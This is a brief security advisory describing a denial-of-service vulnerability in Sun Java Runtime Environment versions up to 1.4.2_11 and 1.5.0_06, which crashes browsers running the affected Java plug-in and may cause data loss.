The Sun Java Runtime Environment is vulnerable to a denial-of-service vulnerability. This issue is due to the software's failure to handle exceptional conditions.

This issue is reported to affect Java Runtime Environment versions up to 1.4.2_11 and 1.5.0_06. This issue will crash Internet browsers running an affected Java plug-in.

An attacker may exploit this issue to cause a vulnerable application -- as well as all processes spawned from the application -- to crash, denying service to legitimate users. Due to the scope of the crash, data loss may occur.
